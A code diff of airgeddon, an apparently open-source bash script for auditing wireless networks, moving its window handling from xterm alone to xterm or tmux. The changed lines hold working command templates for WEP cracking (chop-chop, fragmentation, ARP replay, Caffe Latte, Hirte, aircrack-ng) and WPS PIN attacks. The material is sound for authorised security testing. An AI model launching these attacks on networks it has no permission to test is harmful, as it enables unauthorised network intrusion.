@@ -2,8 +2,8 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20190412
-#Version......: 9.11
+#Date.........: 20190415
+#Version......: 9.20
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -110,8 +110,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="9.11"
-language_strings_expected_version="9.11-1"
+airgeddon_version="9.20"
+language_strings_expected_version="9.20-1"
 standardhandshake_filename="handshake-01.cap"
 timeout_capture_handshake="20"
 tmpdir="/tmp/"
@@ -170,6 +170,7 @@ docker_io_dir="/io"
 
 #WPS vars
 minimum_reaver_pixiewps_version="1.5.2"
+minimum_reaver_nullpin_version="1.6.1"
 minimum_bully_pixiewps_version="1.1"
 minimum_bully_verbosity4_version="1.1"
 minimum_wash_json_version="1.6.2"
@@ -307,7 +308,7 @@ known_arm_compatible_distros=(
 							)
 
 #Hint vars
-declare main_hints=(128 134 163 437 438 442 445 516 590)
+declare main_hints=(128 134 163 437 438 442 445 516 590 626)
 declare dos_hints=(129 131 133)
 declare handshake_hints=(127 130 132 136)
 declare handshake_attack_hints=(142)
@@ -316,11 +317,11 @@ declare personal_decrypt_hints=(171 178 179 208 244 163)
 declare enterprise_decrypt_hints=(171 179 208 244 163 610)
 declare select_interface_hints=(246)
 declare language_hints=(250 438)
-declare option_hints=(445 250 448 477 591)
+declare option_hints=(445 250 448 477 591 626)
 declare evil_twin_hints=(254 258 264 269 309 328 400 509)
 declare evil_twin_dos_hints=(267 268 509)
 declare beef_hints=(408)
-declare wps_hints=(342 343 344 356 369 390 490)
+declare wps_hints=(342 343 344 356 369 390 490 625)
 declare wep_hints=(431 429 428 432 433)
 declare enterprise_hints=(112 332 483 518)
 
@@ -330,6 +331,11 @@ crunch_uppercasecharset="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 crunch_numbercharset="0123456789"
 crunch_symbolcharset="!#$%/=?{}[]-*:;"
 hashcat_charsets=("?l" "?u" "?d" "?s")
+
+#Tmux vars
+session_name="airgeddon"
+tmux_main_window="airgeddon-Main"
+no_hardcore_exit=0
 
 #Check coherence between script and language_strings file
 function check_language_strings() {
@@ -1601,6 +1607,11 @@ function option_menu() {
 	else
 		language_strings "${language}" 593
 	fi
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		language_strings "${language}" 616
+	else
+		language_strings "${language}" 617
+	fi
 	language_strings "${language}" 447
 	print_hint ${current_menu}
 
@@ -1841,6 +1852,16 @@ function option_menu() {
 			fi
 		;;
 		10)
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+				sed -ri "s:(AIRGEDDON_WINDOWS_HANDLING)=(xterm):\1=tmux:" "${scriptfolder}${rc_file}" 2> /dev/null
+			else
+				sed -ri "s:(AIRGEDDON_WINDOWS_HANDLING)=(tmux):\1=xterm:" "${scriptfolder}${rc_file}" 2> /dev/null
+			fi
+			echo
+			language_strings "${language}" 620 "yellow"
+			language_strings "${language}" 115 "read"
+		;;
+		11)
 			ask_yesno 478 "yes"
 			if [ "${yesno}" = "y" ]; then
 				get_current_permanent_language
@@ -2672,6 +2693,9 @@ function handshake_capture_check() {
 	done
 
 	kill "${processidcapture}" &> /dev/null
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		tmux kill-window -t "${session_name}:Capturing Handshake"
+	fi
 }
 
 #Validate if selected network has the needed type of encryption
@@ -2744,6 +2768,9 @@ function kill_wep_windows() {
 	for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
 		kill "${item}" &> /dev/null
 	done
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		kill_tmux_windows
+	fi
 }
 
 #Prepare wep attack deleting temp files
@@ -2768,6 +2795,63 @@ function set_wep_key_script() {
 
 	cat >&8 <<-EOF
 		#!/usr/bin/env bash
+		AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING}"
+	EOF
+
+	cat >&8 <<-EOF
+
+		function manage_output() {
+
+			xterm_parameters="\${1}"
+			tmux_command_line="\${2}"
+			xterm_command_line="\"\${2}\""
+			window_name="\${3}"
+			command_tail=" > /dev/null 2>&1 &"
+
+			case "\${AIRGEDDON_WINDOWS_HANDLING}" in
+				"tmux")
+					local tmux_color
+					tmux_color=""
+					[[ "\${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="\${BASH_REMATCH[2]}"
+					case "\${4}" in
+						"active")
+							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}" "active"
+						;;
+						*)
+							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}"
+						;;
+					esac
+				;;
+				"xterm")
+					eval "xterm \${xterm_parameters} -e \${xterm_command_line}\${command_tail}"
+				;;
+			esac
+		}
+		function start_tmux_processes() {
+
+			window_name="\${1}"
+			command_line="\${2}"
+			tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
+			case "\${4}" in
+				"active")
+					tmux new-window -t "${session_name}:" -n "\${window_name}"
+				;;
+				*)
+					tmux new-window -d -t "${session_name}:" -n "\${window_name}"
+				;;
+			esac
+			local tmux_color_cmd
+			if [ -n "\${3}" ]; then
+				tmux_color_cmd="bg=#000000 fg=\${3}"
+			else
+				tmux_color_cmd="bg=#000000"
+			fi
+			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
+			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
+		}
+	EOF
+
+	cat >&8 <<-EOF
 		wep_key_found=0
 
 		#Check if the wep password was captured and manage to save it on a file
@@ -2840,6 +2924,29 @@ function set_wep_key_script() {
 		}
 	EOF
 
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&8 <<-EOF
+			function kill_tmux_windows() {
+
+				local TMUX_WINDOWS_LIST=()
+				local current_window_name
+				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
+				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
+					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
+					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
+						continue
+					fi
+					if [ -n "\${1}" ]; then
+						if [ "\${current_window_name}" = "\${1}" ]; then
+							continue
+						fi
+					fi
+					tmux kill-window -t "${session_name}:\${current_window_name}"
+				done
+			}
+		EOF
+	fi
+
 	cat >&8 <<-EOF
 		while true; do
 			sleep 1
@@ -2863,6 +2970,15 @@ function set_wep_key_script() {
 
 	cat >&8 <<-EOF
 		kill_wep_script_windows
+	EOF
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&8 <<-EOF
+			kill_tmux_windows "WEP Key Decrypted"
+		EOF
+	fi
+
+	cat >&8 <<-EOF
 		rm -rf "${tmpdir}${wepdir}${wep_processes_file}"
 		touch "${tmpdir}${wepdir}${wep_processes_file}" > /dev/null 2>&1
 	EOF
@@ -2901,17 +3017,19 @@ function set_wep_key_script() {
 
 			window_position="${g5_topright_window}"
 			sleep 0.5
+			manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry \${window_position} -T \"WEP Key Decrypted\"" "clear;\${wep_key_cmd}" "WEP Key Decrypted" "active"
 	EOF
 
-	cat >&8 <<-'EOF'
-			xterm -hold -bg black -fg white -geometry "${window_position}" -T "WEP Key Decrypted" -e "eval \"${wep_key_cmd}\"" > /dev/null 2>&1 &
-			wep_key_window_pid=$!
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		cat >&8 <<-EOF
+			wep_key_window_pid=\$!
 			{
-			echo -e "${wep_key_window_pid}"
-	EOF
+				echo -e "\${wep_key_window_pid}"
+			} >> "${tmpdir}${wepdir}${wep_processes_file}"
+		EOF
+	fi
 
 	cat >&8 <<-EOF
-			} >> "${tmpdir}${wepdir}${wep_processes_file}"
 		fi
 	EOF
 }
@@ -2927,6 +3045,74 @@ function set_wep_script() {
 
 	cat >&6 <<-EOF
 		#!/usr/bin/env bash
+		AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING}"
+		global_process_pid=""
+
+		function manage_output() {
+
+			xterm_parameters="\${1}"
+			tmux_command_line="\${2}"
+			xterm_command_line="\"\${2}\""
+			window_name="\${3}"
+			command_tail=" > /dev/null 2>&1 &"
+
+			case "\${AIRGEDDON_WINDOWS_HANDLING}" in
+				"tmux")
+					local tmux_color
+					tmux_color=""
+					[[ "\${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="\${BASH_REMATCH[2]}"
+					case "\${4}" in
+						"active")
+							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}" "active"
+						;;
+						*)
+							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}"
+						;;
+					esac
+				;;
+				"xterm")
+					eval "xterm \${xterm_parameters} -e \${xterm_command_line}\${command_tail}"
+				;;
+			esac
+		}
+		function start_tmux_processes() {
+
+			window_name="\${1}"
+			command_line="\${2}"
+			tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
+			case "\${4}" in
+				"active")
+					tmux new-window -t "${session_name}:" -n "\${window_name}"
+				;;
+				*)
+					tmux new-window -d -t "${session_name}:" -n "\${window_name}"
+				;;
+			esac
+			local tmux_color_cmd
+			if [ -n "\${3}" ]; then
+				tmux_color_cmd="bg=#000000 fg=\${3}"
+			else
+				tmux_color_cmd="bg=#000000"
+			fi
+			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
+			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
+		}
+		function get_tmux_process_id() {
+
+			local process_pid
+			local process_cmd_line
+			process_cmd_line=\$(echo "\${1}" | tr -d '"')
+			while [ -z "\${process_pid}" ]; do
+				process_pid=\$(ps --no-headers aux | grep "\${process_cmd_line}" | grep -v "grep \${process_cmd_line}" | awk '{print \$2}')
+			done
+			global_process_pid="\${process_pid}"
+		}
+		function kill_tmux_window_by_name() {
+			if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				tmux kill-window -t "${session_name}:\${1}" 2> /dev/null
+			fi
+		}
+
 		#shellcheck disable=SC1037
 		#shellcheck disable=SC2164
 		#shellcheck disable=SC2140
@@ -2956,11 +3142,17 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-							xterm -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (1/3)" -e "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" > /dev/null 2>&1 &
+							manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (1/3)\"" "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" "Chop-Chop Attack (1/3)"
+							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+								get_tmux_process_id "aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface}"
+								wep_chopchop_phase1_pid="\${global_process_pid}"
+								global_process_pid=""
+							else
+								wep_chopchop_phase1_pid=\$!
+							fi
 	EOF
 
 	cat >&6 <<-'EOF'
-							wep_chopchop_phase1_pid=$!
 							wep_script_processes+=(${wep_chopchop_phase1_pid})
 						fi
 					fi
@@ -2969,28 +3161,38 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-					xterm -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (2/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" > /dev/null 2>&1 &
+					kill_tmux_window_by_name "Chop-Chop Attack (1/3)"
+					manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" "Chop-Chop Attack (2/3)"
+					if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+						wep_chopchop_phase2_pid=\$!
+					fi
 	EOF
 
 	cat >&6 <<-'EOF'
-					wep_chopchop_phase2_pid=$!
-					wep_script_processes+=(${wep_chopchop_phase2_pid})
-					wep_chopchop_phase=3
-				;;
-				3)
-					wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase2_pid}$" 2> /dev/null)
-					if [ -z "${wep_chopchop_phase2_pid_alive}" ]; then
+						wep_script_processes+=(${wep_chopchop_phase2_pid})
+						wep_chopchop_phase=3
+					;;
+					3)
+						wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase2_pid}$" 2> /dev/null)
 	EOF
 
 	cat >&6 <<-EOF
-						xterm -hold -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (3/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" > /dev/null 2>&1 &
+						if [[ -z "\${wep_chopchop_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}chopchop.cap" ]]; then
+							kill_tmux_window_by_name "Chop-Chop Attack (2/3)"
+							manage_output "-hold -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
+							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+								get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
+								wep_script_processes+=("\${global_process_pid}")
+								global_process_pid=""
+							else
+								wep_script_processes+=(\$!)
+							fi
 	EOF
 
 	cat >&6 <<-'EOF'
-						wep_script_processes+=($!)
-						wep_chopchop_phase=4
-					fi
-				;;
+							wep_chopchop_phase=4
+						fi
+					;;
 			esac
 			write_wep_processes
 		}
@@ -3019,11 +3221,17 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-							xterm -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (1/3)" -e "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" > /dev/null 2>&1 &
+							manage_output "-bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (1/3)\"" "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" "Fragmentation Attack (1/3)"
+							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+								get_tmux_process_id "aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface}"
+								wep_fragmentation_phase1_pid="\${global_process_pid}"
+								global_process_pid=""
+							else
+								wep_fragmentation_phase1_pid=\$!
+							fi
 	EOF
 
 	cat >&6 <<-'EOF'
-							wep_fragmentation_phase1_pid=$!
 							wep_script_processes+=(${wep_fragmentation_phase1_pid})
 						fi
 					fi
@@ -3032,26 +3240,36 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-					xterm -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (2/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" > /dev/null 2>&1 &
+						kill_tmux_window_by_name "Fragmentation Attack (1/3)"
+						manage_output "-bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" "Fragmentation Attack (2/3)"
+						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+							wep_fragmentation_phase2_pid=\$!
+						fi
 	EOF
 
 	cat >&6 <<-'EOF'
-					wep_fragmentation_phase2_pid=$!
-					wep_script_processes+=(${wep_fragmentation_phase2_pid})
 					wep_fragmentation_phase=3
+					wep_script_processes+=(${wep_fragmentation_phase2_pid})
 				;;
 				3)
 					wep_fragmentation_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fragmentation_phase2_pid}$" 2> /dev/null)
-					if [ -z "${wep_fragmentation_phase2_pid_alive}" ]; then
 	EOF
 
 	cat >&6 <<-EOF
-						xterm -hold -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (3/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" > /dev/null 2>&1 &
+					if [[ -z "\${wep_fragmentation_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}fragmentation.cap" ]]; then
+						kill_tmux_window_by_name "Fragmentation Attack (2/3)"
+						manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" "Fragmentation Attack (3/3)"
+						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}"
+							wep_script_processes+=("\${global_process_pid}")
+							global_process_pid=""
+						else
+							wep_script_processes+=(\$!)
+						fi
 	EOF
 
 	cat >&6 <<-'EOF'
-						wep_script_processes+=($!)
-						wep_fragmentation_phase=4
+							wep_fragmentation_phase=4
 					fi
 				;;
 			esac
@@ -3086,11 +3304,18 @@ function set_wep_script() {
 		}
 
 		wep_script_processes=()
-		xterm -bg black -fg white -geometry "${g5_topright_window}" -T "Capturing WEP Data" -e "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}" > /dev/null 2>&1 &
+
+		manage_output "-bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g5_topright_window} -T \"Capturing WEP Data\"" "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}" "Capturing WEP Data" "active"
+		if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+			get_tmux_process_id "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}"
+			wep_script_capture_pid="\${global_process_pid}"
+			global_process_pid=""
+		else
+			wep_script_capture_pid=\$!
+		fi
 	EOF
 
 	cat >&6 <<-'EOF'
-		wep_script_capture_pid=$!
 		wep_script_processes+=(${wep_script_capture_pid})
 		write_wep_processes
 	EOF
@@ -3115,11 +3340,17 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-				xterm -bg black -fg green -geometry "${g5_left1}" -T "Fake Auth" -e "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+				manage_output "-bg \"#000000\" -fg \"#00FF00\" -geometry ${g5_left1} -T \"Fake Auth\"" "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}" "Fake Auth"
+				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}"
+					wep_fakeauth_pid="\${global_process_pid}"
+					global_process_pid=""
+				else
+					wep_fakeauth_pid=\$!
+				fi
 	EOF
 
 	cat >&6 <<-'EOF'
-				wep_fakeauth_pid=$!
 				wep_script_processes+=(${wep_fakeauth_pid})
 				write_wep_processes
 				sleep 2
@@ -3130,35 +3361,44 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-				xterm -hold -bg black -fg yellow -geometry "${g5_left2}" -T "Arp Broadcast Injection" -e "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+				manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_left2} -T \"Arp Broadcast Injection\"" "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" "Arp Broadcast Injection"
+				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
+					wep_script_processes+=(\$!)
+				fi
+
+				manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g5_left3} -T \"Arp Request Replay\"" "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" "Arp Request Replay"
+				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
+					wep_script_processes+=(\$!)
+				fi
+
+				manage_output "-hold -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g5_left4} -T \"Caffe Latte Attack\"" "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Caffe Latte Attack"
+				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
+					wep_script_processes+=(\$!)
+				fi
+
+				manage_output "-hold -bg \"#000000\" -fg \"#D3D3D3\" -geometry ${g5_left5} -T \"Hirte Attack\"" "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Hirte Attack"
+				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
+					wep_script_processes+=(\$!)
+				fi
 	EOF
 
 	cat >&6 <<-'EOF'
-				wep_script_processes+=($!)
-	EOF
-
-	cat >&6 <<-EOF
-				xterm -hold -bg black -fg red -geometry "${g5_left3}" -T "Arp Request Replay" -e "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" > /dev/null 2>&1 &
-	EOF
-
-	cat >&6 <<-'EOF'
-				wep_script_processes+=($!)
-	EOF
-
-	cat >&6 <<-EOF
-				xterm -hold -bg black -fg pink -geometry "${g5_left4}" -T "Caffe Latte Attack" -e "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-	EOF
-
-	cat >&6 <<-'EOF'
-				wep_script_processes+=($!)
-	EOF
-
-	cat >&6 <<-EOF
-				xterm -hold -bg black -fg grey -geometry "${g5_left5}" -T "Hirte Attack" -e "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-	EOF
-
-	cat >&6 <<-'EOF'
-				wep_script_processes+=($!)
 				write_wep_processes
 			fi
 
@@ -3184,11 +3424,17 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-				xterm -bg black -fg yellow -geometry "${g5_bottomright_window}" -T "Decrypting WEP Key" -e "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" > /dev/null 2>&1 &
+				manage_output "-bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_bottomright_window} -T \"Decrypting WEP Key\"" "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" "Decrypting WEP Key" "active"
+				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aircrack-ng \"${tmpdir}${wep_data}\".*cap -l \"${tmpdir}${wepdir}wepkey.txt\""
+					wep_aircrack_pid="\${global_process_pid}"
+					global_process_pid=""
+				else
+					wep_aircrack_pid=\$!
+				fi
 	EOF
 
 	cat >&6 <<-'EOF'
-				wep_aircrack_pid=$!
 				wep_script_processes+=(${wep_aircrack_pid})
 				write_wep_processes
 			fi
@@ -3217,7 +3463,8 @@ function exec_wps_custom_pin_bully_attack() {
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin bully attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS custom pin bully attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin bully attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin bully attack"
 }
 
 #Execute wps custom pin reaver attack
@@ -3234,7 +3481,8 @@ function exec_wps_custom_pin_reaver_attack() {
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin reaver attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS custom pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin reaver attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin reaver attack"
 }
 
 #Execute bully pixie dust attack
@@ -3251,7 +3499,8 @@ function exec_bully_pixiewps_attack() {
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully pixie dust attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS bully pixie dust attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully pixie dust attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully pixie dust attack"
 }
 
 #Execute reaver pixie dust attack
@@ -3268,7 +3517,8 @@ function exec_reaver_pixiewps_attack() {
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver pixie dust attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS reaver pixie dust attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver pixie dust attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver pixie dust attack"
 }
 
 #Execute wps bruteforce pin bully attack
@@ -3285,7 +3535,8 @@ function exec_wps_bruteforce_pin_bully_attack() {
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS bruteforce pin bully attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS bruteforce pin bully attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin bully attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin bully attack"
 }
 
 #Execute wps bruteforce pin reaver attack
@@ -3302,7 +3553,8 @@ function exec_wps_bruteforce_pin_reaver_attack() {
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS bruteforce pin reaver attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS bruteforce pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin reaver attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin reaver attack"
 }
 
 #Execute wps pin database bully attack
